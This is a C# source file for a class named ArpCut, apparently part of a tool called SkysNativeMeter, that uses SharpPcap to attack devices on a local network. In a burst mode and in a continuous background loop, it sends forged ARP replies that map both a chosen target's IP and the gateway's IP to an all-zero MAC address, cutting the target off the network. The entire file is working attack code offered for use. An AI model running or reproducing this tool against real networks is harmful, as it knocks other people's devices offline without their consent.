using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpCut : IDisposable
{
    private static readonly PhysicalAddress Blackhole = PhysicalAddress.Parse("00-00-00-00-00-00");

    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly CancellationTokenSource _cts = new();
    private PhysicalAddress _gatewayMac;

    public ArpCut(string targetIp, string targetMac, string gatewayIp, string ifaceHint, string localIp)
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));

        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void RunKickBurst()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        try
        {
            for (var i = 0; i < 30; i++)
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                SendBlackhole(_targetMac, _targetMac, IPAddress.Parse(_targetIp), IPAddress.Parse(_gatewayIp));
                SendBlackhole(_gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), IPAddress.Parse(_targetIp));
                Thread.Sleep(50);
            }
        }
        finally
        {
            try { _device.Close(); } catch { /* ignore */ }
        }
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);

        NetworkHelper.EmitJson(new
        {
            type = "started",
            mode = "cut",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            engine = "native"
        });

        var poisonTask = Task.Run(PoisonLoop, _cts.Token);

        try
        {
            while (!_cts.IsCancellationRequested)
            {
                Thread.Sleep(500);
            }
        }
        finally
        {
            _cts.Cancel();
            Task.WaitAll(new[] { poisonTask }, 2000);
            try { _device.Close(); } catch { /* ignore */ }
        }
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                SendBlackhole(_targetMac, _targetMac, IPAddress.Parse(_targetIp), IPAddress.Parse(_gatewayIp));
                SendBlackhole(_gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }

            Thread.Sleep(1500);
        }
    }

    private void SendBlackhole(
        PhysicalAddress ethDest,
        PhysicalAddress arpTargetHw,
        IPAddress arpTargetProto,
        IPAddress senderProto)
    {
        var arp = new ArpPacket(
            ArpOperation.Response,
            arpTargetHw,
            arpTargetProto,
            Blackhole,
            senderProto);

        var eth = new EthernetPacket(ethDest, _ourMac, EthernetType.Arp) { PayloadPacket = arp };
        arp.UpdateCalculatedValues();
        eth.UpdateCalculatedValues();
        _device.SendPacket(eth.Bytes);
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.Close(); } catch { /* ignore */ }
    }
}
